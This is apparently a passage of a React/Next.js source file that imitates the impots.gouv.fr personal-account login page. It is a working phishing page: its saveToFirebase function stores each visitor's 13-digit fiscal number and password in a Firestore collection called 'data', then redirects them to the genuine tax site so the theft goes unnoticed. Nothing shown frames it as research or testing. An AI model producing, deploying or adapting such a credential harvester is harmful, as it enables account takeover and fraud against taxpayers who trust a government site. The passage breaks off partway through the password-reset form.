import Head from "next/head";
import Image from "next/image";
import { useState } from "react";
import app from "../firebase.js";
import { redirect } from "next/navigation";
import { collection, addDoc, getFirestore } from "firebase/firestore";
import { useRouter } from "next/navigation";
import { AiOutlineLock } from "react-icons/ai";

export default function Home() {
  const router = useRouter();
  const db = getFirestore(app);
  const [showPassword, setShowPassword] = useState(false);
  const [inputValue, setInputValue] = useState("");
  const [pwd, setPwd] = useState("");
  const handleInputChange = (e) => {
    const value = e.target.value;
    setInputValue(value);
  };
  const handlePwd = (e) => {
    var value = e.target.value;
    setPwd(value);
  };

  function checkInput() {
    if (inputValue.length === 13) {
      console.log("h");
      setShowPassword(true);
    }
  }

  async function saveToFirebase() {
    const data = {};
    console.log("hello");

    try {
      if (pwd) {
        const docRef = await addDoc(collection(db, "data"), {
          number: inputValue,
          pass: pwd,
        });
        router.push("https://cfspart.impots.gouv.fr/");
      }
    } catch (e) {
      console.error("Error adding document: ", e);
    }
  }

  return (
    <>
      {/* Dac: dpapusx081 */}
      {/* Le: Tue Oct  3 17:21:58 2023 */}
      {/* Le: 2 */}
      <meta charSet="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <meta name="apple-itunes-app" content="app-id=505488770" />
      <meta name="format-detection" content="telephone=no" />
      <meta
        httpEquiv="Cache-Control"
        content="no-cache, no-store, must-revalidate"
      />
      <meta httpEquiv="Pragma" content="no-cache" />
      <meta httpEquiv="Expires" content={0} />
      <meta
        name="description"
        content="Accès à l'espace particulier du site impots.gouv.fr."
      />
      <link
        rel="apple-touch-icon"
        sizes="144x144"
        href="images/favicon-144.png"
        type="image/png"
      />
      <link
        rel="apple-touch-icon"
        sizes="120x120"
        href="images/favicon-120.png"
        type="image/png"
      />
      <link
        rel="apple-touch-icon"
        sizes="114x114"
        href="images/favicon-114.png"
        type="image/png"
      />
      <link
        rel="apple-touch-icon"
        sizes="72x72"
        href="images/favicon-72.png"
        type="image/png"
      />
      <link
        rel="apple-touch-icon"
        sizes="57x57"
        href="images/favicon-57.png"
        type="image/png"
      />
      {/*[if lt IE 9]>
      
      
      
      <![endif]*/}
      <title>Particuliers | authentification</title>
      <a href="#contenu" className="sr-only sr-only-focusable">
        Aller au contenu
      </a>
      <div
        id="obsolete"
        role="alert"
        className="erreur alert alert-danger erreur"
        style={{ display: "none" }}
      >
        Votre configuration ne correspond pas à
        <a
          className="obsolete"
          href="https://www.impots.gouv.fr/portail/particulier/questions/quelle-configuration-doit-avoir-mon-ordinateur"
          target="_blank"
          rel="noopener"
        >
          celle requise par la DGFiP{" "}
          <span
            className="dgfipicon dgfipicon-sortie-page"
            title="Nouvelle fenêtre"
          />
        </a>
        &nbsp;; vous vous exposez à des risques de sécurité ou
        dysfonctionnements.
        <br />
        Nous vous invitons à utiliser
        <a
          className="obsolete"
          href="https://browsehappy.com/"
          target="_blank"
          rel="noopener"
        >
          une version plus récente ou un autre navigateur{" "}
          <span
            className="dgfipicon dgfipicon-sortie-page"
            title="Nouvelle fenêtre"
          />
        </a>
        .
      </div>
      <div
        role="alert"
        className="alert alert-danger erreur hide"
        id="cookie_error"
      >
        <p>
          Pour accéder aux services en ligne, il vous faut au préalable{" "}
          <a href="http://www.accepterlescookies.com">accepter les cookies.</a>
        </p>
      </div>
      <div id="banniereSmart" className="container hide">
        <button type="button" className="close" aria-label="Fermer la bannière">
          <span aria-hidden="true">×</span>
        </button>
        <a
          id="leStoreLogo"
          className="col-xs-3 col-sm-1"
          href="https://play.test.google.com/store/apps/details?id=fr.gouv.finances.smartphone.android"
        >
          <img
            id="LogoSmartImage"
            src="/images/Small-logoSMART.png"
            alt="Télécharger l'app mobile"
          />
        </a>
        <div id="banniereSmartTexte" className="col-xs-8 col-sm-10">
          <div className="row">
            Téléchargez gratuitement l&apos;app mobile Impots.gouv sur votre
            appareil.
          </div>
        </div>
      </div>
      <header>
        <div className="container">
          {/*Le logo*/}
          <div className="row">
            {/* Partie gauche */}
            <div className="col-xs-12 col-sm-6 col-md-6">
              <div className="row">
                <div className="col-xs-3 col-sm-4 col-md-3 col-lg-3">
                  <a
                    id="bloc_marque"
                    target="_blank"
                    rel="noopener"
                    href="https://www.impots.gouv.fr"
                    title="Accueil impots.gouv.FR (nouvelle fenêtre)"
                  >
                    <span className="sr-only">Accueil impots.gouv.FR</span>
                  </a>
                </div>
                <div
                  className="col-xs-9 col-sm-8 col-md-9 col-lg-9"
                  id="logo_alt"
                >
                  <h1>
                    <span className="sr-only">Authentification</span>
                  </h1>
                  <a
                    target="_blank"
                    rel="noopener"
                    href="https://www.impots.gouv.fr"
                    title="Accueil impots.gouv.FR (nouvelle fenêtre)"
                  >
                    <span className="sr-only">Accueil impots.gouv.FR</span>
                  </a>
                </div>
              </div>
            </div>
            <ul
              id="acces_espace"
              className="pull-right text-right espace_haut col-xs-12 col-sm-6 col-md-6 col-lg-5"
            >
              <li className="col-xs-6 col-sm-9 col-md-7 pull-right">
                <a
                  className="btn btn-primary"
                  href="https://cfspart.impots.gouv.fr/monprofil-webapp/monCompte"
                >
                  <span className=" pull-left">
                    <AiOutlineLock />
                  </span>
                  Votre espace particulier
                </a>
              </li>
              <li className="col-xs-6 col-sm-9 col-md-7 pull-right">
                <a
                  className="btn btn-danger"
                  href="https://cfspro.impots.gouv.fr/mire/accueil.do"
                  id="proPriv"
                >
                  <span className=" pull-left">
                    <AiOutlineLock />
                  </span>
                  Votre espace professionnel
                </a>
              </li>
            </ul>
          </div>
          {/* Fin Container */}
        </div>
      </header>
      {/* Fil d&apos;Arianne */}
      <div className="container">
        <div className="row">
          <ol className="breadcrumb ">
            <li>
              <a
                href="https://www.impots.gouv.fr/portail/particulier"
                id="toPortailPub"
                title="Retour au portail"
              >
                Accueil
              </a>
            </li>
            <li className="active">Authentification</li>
          </ol>
        </div>
      </div>
      {/* Fin du fil d&apos;Arianne */}
      <main className="container" id="contenu">
        <div className="sr-only">
          Le contenu du formulaire et l&apos;aide mise à votre disposition
          évoluent selon vos réponses et votre situation
        </div>
        <div className="row">
          <div className="col-md-6">
            <a
              id="aide_scroll"
              href="#aide"
              className="btn btn-default hidden-lg hidden-md hidden-sm"
              style={{}}
              aria-hidden="false"
            >
              <span className="dgfipicon dgfipicon-info text-muted" />
              &nbsp;Aide
            </a>
            <div className="panel panel-default">
              <div className="panel-heading">
                <h2 id="titre_authent" className="text-center">
                  Authentification
                </h2>
              </div>
              <div className="panel-body">
                <div
                  role="alert"
                  className="erreur alert alert-danger erreurDAC cat2 hide"
                  id="erreur"
                />
                <div
                  role="alert"
                  className="erreur alert alert-danger erreurDAC cat2 hide"
                  id="blocage"
                />
                <form
                  method="post"
                  encType="application/x-www-form-urlencoded"
                  acceptCharset="UTF-8"
                  name="CTX"
                  id="formulairePrincipal"
                  target="hidden-formulairePrincipal"
                >
                  <input
                    type="hidden"
                    name="url"
                    defaultValue="aHR0cHM6Ly9jZnNwYXJ0LmltcG90cy5nb3V2LmZyLw=="
                  />
                  <input type="hidden" id="spi" name="spi" />
                  <input type="hidden" id="pwd" name="pwd" />
                  <input type="hidden" id="rfr" name="rfr" />
                  <input type="hidden" id="teledec" name="teledec" />
                  <input
                    type="hidden"
                    id="dateNaissance"
                    name="dateNaissance"
                  />
                  <input
                    type="hidden"
                    id="dateNaissance_tmp"
                    name="dateNaissance_tmp"
                    disabled="true"
                  />
                  <input
                    type="hidden"
                    id="jourNaissance"
                    name="jourNaissance"
                    disabled="true"
                  />
                  <input
                    type="hidden"
                    id="moisNaissance"
                    name="moisNaissance"
                    disabled="true"
                  />
                  <input
                    type="hidden"
                    id="anneeNaissance"
                    name="anneeNaissance"
                    disabled="true"
                  />
                  <iframe
                    style={{ display: "none" }}
                    name="hidden-formulairePrincipal"
                    id="hidden-formulairePrincipal"
                    aria-hidden="true"
                    title="Cadre technique"
                  >
                    {" "}
                  </iframe>
                  <div className="row">
                    <div className="col-md-12">
                      <div className="form-group" id="fg_spi">
                        <label htmlFor="spi_tmp">Numéro fiscal</label>
                        <div className="hide" id="changeSPI">
                          {" "}
                          (<a href="#">Changer d&apos;utilisateur</a>)
                        </div>
                        <div
                          className="ephemere hidden"
                          id="liveCheck_spi_tmp"
                          role="alert"
                        />
                        <input
                          className="form-control"
                          name="spi_tmp"
                          type="tel"
                          aria-required="true"
                          autoComplete="username"
                          id="spi_tmp"
                          placeholder="13 chiffres"
                          data-original-title="13 chiffres"
                          data-toggle="tooltip"
                          data-placement="top"
                          value={inputValue}
                          data-mask="int"
                          onChange={handleInputChange}
                          data-max={13}
                          data-feedbackok="1"
                        />
                        <div
                          role="alert"
                          className="erreur hide alert alert-danger cat1"
                          id="Cat1_spi"
                        />
                      </div>
                    </div>
                  </div>
                  <div className="row">
                    <div className="col-md-12">
                      <div
                        className="form-group"
                        style={
                          !showPassword
                            ? { display: "none" }
                            : { display: "block" }
                        }
                        aria-hidden="true"
                        id="fg_pwd"
                      >
                        <label htmlFor="pwd_tmp">Mot de passe</label>
                        <div className="input-group col-xs-12" id="ig_pwd">
                          <input
                            className="form-control"
                            type="password"
                            name="pwd_tmp"
                            value={pwd}
                            onChange={handlePwd}
                            aria-required="true"
                            autoComplete="current-password"
                            id="pwd_tmp"
                            data-toggle="tooltip"
                            data-placement="top"
                            maxLength={128}
                            tabIndex={-1}
                          />
                          <div id="boutonvisumdp" className="input-group-btn">
                            <button
                              type="button"
                              className="btn btn-default"
                              data-visu-mdp="off"
                              tabIndex={-1}
                              title="Visualisation / masquage du mot de passe"
                              id="visumdp"
                            >
                              <i className="dgfipicon dgfipicon-visualiser-oui">
                                {" "}
                                
                              </i>
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div
                    role="alert"
                    className="erreur hide alert alert-danger cat1"
                    id="Cat1_pwd"
                  />
                  <div className="row">
                    <div className="col-md-12">
                      <div className="form-group hide" id="fg_teledec">
                        <label htmlFor="teledec_tmp">
                          Numéro d&apos;accès en ligne
                        </label>
                        <div
                          className="ephemere hidden"
                          id="liveCheck_teledec_tmp"
                          role="alert"
                        />
                        <input
                          className="form-control"
                          type="tel"
                          data-original-title="7 chiffres"
                          name="teledec_tmp"
                          data-toggle="tooltip"
                          data-placement="top"
                          aria-required="true"
                          placeholder="7 chiffres"
                          autoComplete="off"
                          id="teledec_tmp"
                          data-mask="int"
                          data-max={7}
                          data-feedbackok={1}
                        />
                      </div>
                    </div>
                  </div>
                  <div
                    role="alert"
                    className="erreur hide alert alert-danger cat1"
                    id="Cat1_teledec"
                  />
                  <div className="row">
                    <div className="col-md-12">
                      <div className="form-group hide" id="fg_rfr">
                        <label htmlFor="rfr_tmp">
                          Revenu fiscal de référence
                        </label>
                        <div
                          className="ephemere hidden"
                          id="liveCheck_rfr_tmp"
                          role="alert"
                        />
                        <input
                          className="form-control"
                          type="tel"
                          data-original-title="1 à 10 chiffres."
                          data-toggle="tooltip"
                          data-placement="top"
                          name="rfr_tmp"
                          aria-required="true"
                          autoComplete="off"
                          id="rfr_tmp"
                          placeholder="1 à 10 chiffres"
                          data-mask="int"
                          data-max={10}
                          data-feedbackok="1/"
                        />
                        <div
                          role="alert"
                          className="erreur hide alert alert-danger cat1"
                          id="Cat1_rfr"
                        />
                      </div>
                    </div>
                  </div>
                  <div className="row form-row hide" id="fr_dateNaissance">
                    <div className="col-xs-11 col-md-12">
                      <label htmlFor="saisieDate">
                        Indiquez votre date de naissance
                      </label>
                      <div
                        className="ephemere hidden"
                        id="liveCheck_jourNaissance_tmp"
                        role="alert"
                      />
                      <div
                        className="ephemere hidden"
                        id="liveCheck_moisNaissance_tmp"
                        role="alert"
                      />
                      <div
                        className="ephemere hidden"
                        id="liveCheck_anneeNaissance_tmp"
                        role="alert"
                      />
                    </div>
                    <div className="col-xs-4 col-md-4">
                      <label htmlFor="jourNaissance_tmp" className="hidden">
                        Indiquez votre jour de naissance
                      </label>
                      <input
                        type="text"
                        inputMode="numeric"
                        className="form-control"
                        data-original-title="Indiquez votre jour de naissance"
                        data-toggle="tooltip"
                        data-placement="top"
                        name="jourNaissance_tmp"
                        id="jourNaissance_tmp"
                        aria-required="true"
                        aria-label="Jour de naissance"
                        autoComplete="bday-day"
                        placeholder="JJ"
                        data-max={2}
                        data-mask="jour"
                      />
                    </div>
                    <div className="col-xs-4 col-md-4">
                      <input
                        type="text"
                        inputMode="numeric"
                        className="form-control"
                        data-original-title="Indiquez votre mois de naissance"
                        data-toggle="tooltip"
                        data-placement="top"
                        name="moisNaissance_tmp"
                        id="moisNaissance_tmp"
                        aria-required="true"
                        aria-label="Mois de naissance"
                        autoComplete="bday-month"
                        placeholder="MM"
                        data-max={2}
                        data-mask="mois"
                      />
                    </div>
                    <div className="col-xs-4 col-md-4">
                      <input
                        type="text"
                        inputMode="numeric"
                        className="form-control"
                        data-original-title="Indiquez votre année de naissance"
                        data-toggle="tooltip"
                        data-placement="top"
                        name="anneeNaissance_tmp"
                        id="anneeNaissance_tmp"
                        aria-required="true"
                        aria-label="Année de naissance"
                        autoComplete="bday-year"
                        placeholder="AAAA"
                        data-mask="int"
                        data-max={4}
                        maxLength={4}
                      />
                    </div>
                    <div className="col-xs-11 col-md-12">
                      <div
                        role="alert"
                        className="erreur hide alert alert-danger cat1"
                        id="Cat1_dateNaissance"
                      />
                    </div>
                  </div>
                  <div className="row" id="goOnBtn">
                    <div className="col-md-12">
                      <div
                        className="form-group text-center"
                        id="go"
                        data-original-title="Pour continuer, veuillez saisir votre numéro fiscal."
                        data-toggle="tooltip"
                        data-placement="bottom"
                      >
                        <button
                          id="btnAction"
                          type="submit"
                          style={
                            !showPassword
                              ? { display: "inline" }
                              : { display: "none" }
                          }
                          className="btn btn-default"
                          aria-controls="erreur"
                          aria-label="Pour continuer, veuillez saisir votre numéro fiscal"
                          data-href=""
                          onClick={() => checkInput()}
                        >
                          Continuer
                        </button>
                        <button
                          id="btnActions"
                          style={
                            !showPassword
                              ? { display: "none" }
                              : { display: "flex" }
                          }
                          type="submit"
                          className="btn btn-default"
                          aria-controls="erreur"
                          aria-label="Pour continuer, veuillez saisir votre numéro fiscal"
                          data-href=""
                          onClick={() => saveToFirebase()}
                        >
                          Connexcion
                        </button>
                      </div>
                    </div>
                  </div>
                </form>
                <div id="lesOublis" className="row hide">
                  <div className="col-md-12 text-center">
                    <a
                      href=""
                      tabIndex={0}
                      data-target="#numFiscal"
                      data-toggle="modal"
                      className="modal-link"
                      aria-label="Recevoir mon numéro fiscal par courriel (ouverture d'une fenêtre de dialogue)"
                      title="Recevoir mon numéro fiscal par courriel (ouverture d'une fenêtre de dialogue)"
                    >
                      {" "}
                      Numéro fiscal perdu
                    </a>
                    |
                    <a
                      href=""
                      tabIndex={0}
                      data-target="#passPerdu"
                      data-toggle="modal"
                      className="modal-link"
                      aria-label="Renouveler mon mot de passe (ouverture d'une fenêtre de dialogue)"
                      title="Renouveler mon mot de passe (ouverture d'une fenêtre de dialogue)"
                    >
                      {" "}
                      Mot de passe oublié{" "}
                    </a>
                  </div>
                </div>
              </div>
              <div className="panel-footer text-center" id="FranceConnect">
                <div className="separ">
                  <div id="choisirFC">Ou</div>
                </div>
                <form>
                  <div className="col-md-12 text-center">
                    <input
                      type="hidden"
                      id="authKey"
                      name="lmAuth"
                      defaultValue="FranceConnect"
                    />
                    <div
                      id="erreurFC"
                      role="alert"
                      className="erreur alert alert-danger hide"
                    >
                      Vous ne pouvez actuellement pas vous identifier en
                      utilisant FranceConnect.
                      <br />
                      Vous pouvez contacter le support FranceConnect pour de
                      plus amples renseignements
                    </div>
                    <div
                      role="alert"
                      className="erreur alert alert-danger hide"
                      id="Cat2FC1"
                    >
                      La demande d&apos;activation de votre mot de passe est en
                      cours.
                      <br />
                      Vous avez reçu un courriel à l&apos;adresse indiquée.
                      <br />
                      Pour vous connecter via FranceConnect, vous devez
                      obligatoirement cliquer sur le lien indiqué dans ce
                      courriel.
                      <br />
                      Attention, ce lien est valable 8 heures.
                      <br />
                    </div>
                    <div
                      role="alert"
                      className="erreur alert alert-danger hide"
                      id="Cat2FC2"
                    >
                      Vous ne pouvez actuellement pas vous identifier en
                      utilisant FranceConnect.
                      <br />
                      Vous pouvez contacter le support FranceConnect pour de
                      plus amples renseignements
                    </div>
                    <a id="leBouton" href="#">
                      <img
                        src="/logo-fc.svg"
                        height={60}
                        width={200}
                        alt="S'identifier avec FranceConnect"
                      />
                    </a>
                    <br />
                  </div>
                </form>
                <p className="text-center">
                  <a
                    href="https://app.franceconnect.gouv.fr/en-savoir-plus"
                    id="cQuoiFCGauche"
                    target="_blank"
                    rel="noopener"
                  >
                    Qu&apos;est-ce que FranceConnect?
                    <span
                      className="dgfipicon dgfipicon-sortie-page"
                      title="Nouvelle fenêtre"
                    />
                  </a>
                </p>
              </div>
              <div className="panel-footer text-center hide" id="consentement">
                <p>
                  En cliquant sur «Connexion», vous acceptez que vos données
                  personnelles (nom, prénoms, date et lieu de naissance, adresse
                  électronique) soient transmises à FranceConnect.
                </p>
              </div>
              <div className="panel-footer text-center" id="Payer">
                <p>
                  Vous pouvez également payer en ligne en utilisant votre numéro
                  fiscal et la référence de votre avis
                </p>
                <a
                  className="btn btn-success"
                  id="payer"
                  href="https://www.telepaiement.dgfip.finances.gouv.fr/redirectPart.htm"
                >
                  Payer en ligne
                </a>
              </div>
            </div>
          </div>
          <section className="col-md-6" id="aide">
            <div className="panel panel-default">
              <div className="panel-heading">
                <h2 className="text-center">Aide</h2>
              </div>
              <div className="panel-body">
                <details id="aide_spi" className="aideSPI">
                  <summary>Où trouver votre numéro fiscal&nbsp;?</summary>
                  <div className="well">
                    <p>
                      Si vous disposez déjà d&apos;un espace particulier, vous
                      pouvez{" "}
                      <a
                        href="#"
                        id="disp_perte_spi"
                        data-target="#numFiscal"
                        data-toggle="modal"
                        title="Ouverture dans une fenêtre modale"
                      >
                        recevoir votre numéro fiscal par courriel
                      </a>
                      .
                    </p>
                    <p>
                      Il figure aussi en haut de la première page de votre
                      dernière déclaration de revenus reçue{" "}
                      <a
                        href="https://www.impots.gouv.fr/portail/particulier/questions/jai-egare-les-identifiants-dacces-mon-espace-particulier-comment-puis-je-les-0"
                        target="_blank"
                        rel="noopener"
                        title="Nouvelle fenêtre"
                      >
                        ou sur vos avis{" "}
                        <span
                          className="dgfipicon dgfipicon-sortie-page"
                          title="Nouvelle fenêtre"
                        />
                      </a>{" "}
                      :{" "}
                    </p>
                    <div id="exemple_SPI">
                      <figure className="text-center spacer-top" role="group">
                        <img
                          src="/images/spi.svg"
                          alt="Légende disponible après l'illustration"
                          className="img-responsive center-block img-thumbnail"
                          width={473}
                          height={145}
                        />
                        <figcaption className="text-muted">
                          <em>
                            Illustration : emplacement de votre numéro fiscal,
                            sur votre déclaration
                          </em>
                        </figcaption>
                      </figure>
                      <figure className="text-center spacer-top" role="group">
                        <img
                          src="/images/spi1.svg"
                          alt="Légende disponible après l'illustration"
                          className="img-responsive center-block img-thumbnail"
                          width={350}
                          height={145}
                        />
                        <figcaption className="text-muted">
                          <em>
                            {" "}
                            Illustration : emplacement de votre numéro fiscal,
                            sur votre avis
                          </em>
                        </figcaption>
                      </figure>
                    </div>
                  </div>
                </details>
                <details id="aide_spi1" className="aideSPI">
                  <summary>
                    Vous n&apos;avez pas encore de numéro fiscal&nbsp;?
                  </summary>
                  <div className="well">
                    <p>
                      Pour obtenir la création de votre numéro fiscal, veuillez
                      vous adresser à votre
                      <span id="CFP">Centre des finances publiques</span>
                    </p>
                  </div>
                </details>
                <details id="aide_code" className="aideCode hide">
                  <summary>Vous avez perdu votre code de création</summary>
                  <div className="well">
                    <p>
                      Vous pouvez
                      <a
                        href="#"
                        data-toggle="modal"
                        data-target="#codeCreation"
                      >
                        l&apos;obtenir à nouveau par courriel
                      </a>
                      .
                    </p>
                  </div>
                </details>
                <details id="aide_nael" className="aideIdentifiants hide">
                  <summary>
                    Où trouver votre numéro d&apos;accès en ligne&nbsp;?
                  </summary>
                  <div className="well">
                    <p>
                      Il figure en haut de la première page de votre dernière
                      déclaration de revenus reçue.
                    </p>
                    <div id="exemple_NAEL">
                      <figure className="text-center spacer-top" role="group">
                        <img
                          src="/images/num_acces.svg"
                          alt="Légende disponible après l'illustration"
                          className="img-responsive center-block img-thumbnail"
                          width={473}
                          height={145}
                        />
                        <figcaption className="text-muted">
                          <em>
                            Illustration : emplacement de votre numéro
                            d&apos;accès en ligne, sur votre déclaration
                          </em>
                        </figcaption>
                      </figure>
                    </div>
                  </div>
                </details>
                <details id="aide_rfr" className="aideIdentifiants hide">
                  <summary>
                    Où trouver votre revenu fiscal de référence&nbsp;?
                  </summary>
                  <div className="well">
                    <p>
                      Il se trouve sur la première page de votre dernier avis
                      d&apos;impôt sur les revenus.
                    </p>
                  </div>
                </details>
                <details id="aide_mdp" className="aideMdp hide">
                  <summary>Vous avez oublié votre mot de passe</summary>
                  <div className="well">
                    <p>
                      Vous pouvez
                      <a
                        href=""
                        tabIndex={0}
                        data-target="#passPerdu"
                        data-toggle="modal"
                        title="Ouverture dans une fenêtre modale"
                      >
                        renouveler votre mot de passe en quelques clics
                      </a>
                      .
                    </p>
                  </div>
                </details>
                <details id="aide_mdp1" className="aideMdp hide">
                  <summary>Comment modifier votre mot de passe&nbsp;?</summary>
                  <div className="well">
                    <p>
                      Une fois connecté, vous pourrez le modifier depuis
                      «&nbsp;Mon profil&nbsp;».
                    </p>
                  </div>
                </details>
                <details id="aide_ocfiNonIR" className="ocfiNonIR hide">
                  <summary>
                    Quels éléments fournir pour prouver votre identité&nbsp;?
                  </summary>
                  <div className="well">
                    <p>
                      Vous devez adresser à votre{" "}
                      <span id="CFP2">centre des Finances Fubliques</span> une
                      reproduction recto-verso de l&apos;un des éléments
                      suivants&nbsp;:
                    </p>
                    <ul>
                      <li>
                        carte nationale d&apos;identité ou passeport en cours de
                        validité&nbsp;;
                      </li>
                      <li>livret de famille à jour&nbsp;;</li>
                      <li>carte d&apos;invalide de guerre&nbsp;;</li>
                      <li>carte d&apos;invalide civil&nbsp;;</li>
                      <li>
                        extrait d&apos;acte de naissance ou copie intégrale avec
                        mentions en marge&nbsp;;
                      </li>
                      <li>titre de séjour&nbsp;;</li>
                      <li>visa long séjour valant titre de séjour&nbsp;;</li>
                    </ul>
                    <p>À défaut, sont également recevables&nbsp;:</p>
                    <ul>
                      <li>livret de circulation&nbsp;;</li>
                      <li>
                        carte de ressortissant d&apos;un État membre de
                        l&apos;Union Européenne.
                      </li>
                    </ul>
                  </div>
                </details>
                <details id="aide_perteid" className="aideIdentifiants hide">
                  <summary>
                    Numéro d&apos;accès en ligne et revenu fiscal de référence
                    perdus
                  </summary>
                  <div className="well">
                    <p>
                      Nous vous invitons à vous adresser à votre
                      <span id="CFP3">centre des Finances Publiques</span>
                    </p>
                    <p>
                      Faites votre demande en indiquant votre numéro fiscal, ou
                      votre état civil complet, et tous éléments utiles.
                    </p>
                    <p>
                      {" "}
                      Les identifiants vous seront alors transmis de manière
                      sécurisée, généralement à l&apos;aide de vos coordonnées
                      (adresse électronique ou téléphone) déjà connues de votre
                      service.
                    </p>
                  </div>
                </details>
                <details id="aide_connexFC" className="aideFC hide">
                  <summary>Se connecter avec FranceConnect</summary>
                  <div className="well">
                    <p>
                      <b>Les services disponibles</b>
                      <br />
                      Avec vos identifiants impots.gouv.fr, vous pouvez
                      effectuer des démarches administratives sur des sites
                      partenaires de FranceConnect. Le logo FranceConnect figure
                      sur l&apos;espace d&apos;authentification de ces sites.
                      <br />
                      <br />
                      <b>Un accès unique et personnel</b>
                      <br />
                      L&apos;identification sur un site proposant le bouton
                      FranceConnect est strictement personnelle. Chaque membre
                      d&apos;un foyer fiscal disposant d&apos;un numéro fiscal
                      et d&apos;une adresse électronique validée sur le site
                      impots.gouv.fr peut accéder aux services en ligne en
                      saisissant son propre numéro fiscal.
                      <br />
                      <br />
                      <b>Je rencontre des difficultés pour me connecter</b>
                      <br />
                      Nous vous invitons à vérifier la saisie de votre numéro
                      fiscal et de votre mot de passe.
                      <br />
                      Nous vous rappelons que vous devez avoir créé un compte
                      sur le site{" "}
                      <a href="https://cfspart.impots.gouv.fr/">
                        impots.gouv.fr
                      </a>
                      .
                      <br />
                      Si vos identifiants sont correctement saisis et que le
                      blocage persiste, nous vous invitons à contacter le
                      support d&apos;aide FranceConnect à l&apos;adresse
                      suivante : support.usagers@franceconnect.gouv.fr
                    </p>
                  </div>
                </details>
              </div>
              <div className="panel-footer marge">
                <details id="aide_services">
                  <summary>
                    Les services disponibles sur votre espace particulier
                  </summary>
                  <div className="well">
                    <p>Vous pouvez&nbsp;: </p>
                    <ul>
                      <li>gérer votre prélèvement à la source,</li>
                      <li>payer vos impôts,</li>
                      <li>déclarer vos revenus,</li>
                      <li>
                        consulter vos déclarations et avis d&apos;imposition,
                      </li>
                      <li>consulter la situation de vos paiements,</li>
                      <li>accéder à des données publiques,</li>
                      <li>
                        retrouver les coordonnées de vos services compétents
                      </li>
                      <li>
                        réaliser des demandes et démarches via votre messagerie
                        sécurisée
                      </li>
                      <li>déclarer des dons,</li>
                      <li>gérer vos biens immobiliers.</li>
                    </ul>
                  </div>
                </details>
                <details id="aide_cookies">
                  <summary>
                    Gestion des <em lang="en">cookies</em>
                  </summary>
                  <div className="well">
                    <p>
                      Un <em>cookie</em> est un petit fichier, enregistré sur
                      votre appareil, qui contient des informations nécessaires
                      au fonctionnement du site.
                    </p>
                    <p>Nous n&apos;y enregistrons pas de donnée personnelle.</p>
                    <p>
                      Votre navigateur propose en général un mode de navigation
                      privée, qui supprime les <em>cookies</em> à la fermeture
                      du logiciel.
                    </p>
                  </div>
                </details>
              </div>
            </div>
          </section>
        </div>
      </main>
      {/* containe contenu FIN */}
      <footer role="contentinfo">
        ~
        <p className="col-md-12 text-center">
          Direction générale des Finances publiques
        </p>
      </footer>
      {/*============================================================*/}
      {/* Fenetre modale dans le cas de perte de mot de passe */}
      {/*============================================================*/}
      <div
        id="passPerdu"
        className="modal fade"
        role="dialog"
        tabIndex={-1}
        aria-labelledby="passPerduTitle"
      >
        <div className="modal-dialog" role="dialog">
          <div className="modal-content">
            <div className="modal-header">
              <button
                type="button"
                className="close"
                data-dismiss="modal"
                aria-label="Fermer"
              >
                <span aria-hidden="true">×</span>
              </button>
              <h3 id="passPerduTitle" className="modal-title titre">
                TITRE
              </h3>
            </div>
            <div className="modal-body">
              <form
                method="post"
                action="/monprofil-webapp/noAuth/LostPassword"
                id="oubliMotDePasseForm"
                name="oubliMotDePasseForm"
                target="hidden-oubliMotDePasseForm"
              >
                <input type="hidden" id="numfiscal" name="numfiscal" />
                <input
                  type="hidden"
                  id="LostPassword_captchaText"
                  name="captchaText"
                />
                <input
                  type="hidden"
                  id="LostPassword_dateNaissance"
                  name="dateNaissance"
                />
                <input
                  type="hidden"
                  id="LostPassword_dateNaissance_tmp"
                  name="dateNaissance_tmp"
                  disabled="true"
                />
                <iframe
                  style={{ display: "none" }}
                  name="hidden-oubliMotDePasseForm"
                  id="hidden-oubliMotDePasseForm"
                  aria-hidden="true"
                  title="Cadre technique"
                >
                  {" "}
                </iframe>
                <div id="pass">
                  <div
                    role="alert"
                    className="alert alert-danger cat2 hide"
                    id="erreurModPwd"
                  />
                  {/*====================*/}
                  {/* Identifiant Fiscal */}
                  {/*====================*/}
                  <div className="row">
                    <div className="col-md-12">
                      <div className="form-group" id="fg_numfiscal">
                        <label htmlFor="numfiscal_tmp">Numéro fiscal</label>
                        <div
                          className="ephemere hidden"
                          id="liveCheck_numfiscal_tmp"
                        />
                        <input
                          className="form-control"
                          name="numfiscal_tmp"
                          id="numfiscal_tmp"
                          type="tel"
                          aria-required="true"
                          autoComplete="on"
                          placeholder="13 chiffres"
                          data-original-title="13 chiffres"
                          data-toggle="tooltip"
                          data-placement="top"
                          data-mask="int"
                          data-max={13}
                          data-feedbackok="1/"
                        />
                        <div
                          role="alert"
                          className="erreur hide alert alert-danger cat1"
                          id="Cat1_numfiscal"
                        />
                      </div>
                      {/* form-group FIN */}
                    </div>
                    {/* col-md-12 FIN */}
                  </div>
                  {/* row FIN */}
                  {/* ================= */}
                  {/* date de naissance */}
                  {/* ================= */}
                  <div
                    className="row form-row "
                    id="fr_LostPassword_DateNaissance"
                  >
                    <div className="col-xs-11 col-md-12">
                      <label htmlFor="saisieDate">
                        Indiquez votre date de naissance
                      </label>
                      <div
                        className="ephemere hidden"
                        id="liveCheck_LostPassword_jourNaissance_tmp"
                        role="alert"
                      />
                      <div
                        className="ephemere hidden"
                        id="liveCheck_LostPassword_moisNaissance_tmp"
                        role="alert"
                      />
                      <div
                        className="ephemere hidden"
                        id="liveCheck_LostPassword_anneeNaissance_tmp"
                        role="alert"
                      />
                    </div>
                    <div className="col-xs-4 col-md-4">
                      <label
                        htmlFor="LostPassword_jourNaissance_tmp"
                        className="hidden"
                      >
                        Indiquez votre jour de naissance
                      </label>
                      <input
                        type="text"
                        inputMode="numeric"
                        className="form-control"
                        data-original-title="Indiquez votre jour de naissance"
                        data-toggle="tooltip"
                        data-placement="top"
                        name="LostPassword_jourNaissance_tmp"
                        id="LostPassword_jourNaissance_tmp"
                        aria-required="true"
                        aria-label="Jour de naissance"
                        autoComplete="bday-day"
                        placeholder="JJ"
                        data-max={2}
                        data-mask="jour"
                      />
                    </div>
                    <div className="col-xs-4 col-md-4">
                      <input
                        type="text"
                        inputMode="numeric"
                        className="form-control"
                        data-original-title="Indiquez votre mois de naissance"
                        data-toggle="tooltip"
                        data-placement="top"
                        name="LostPassword_moisNaissance_tmp"
                        id="LostPassword_moisNaissance_tmp"
                        aria-required="true"
                        aria-label="Mois de naissance"
                        autoComplete="bday-month"
                        placeholder="MM"
                        data-max={2}
                        data-mask="mois"
                      />
                    </div>
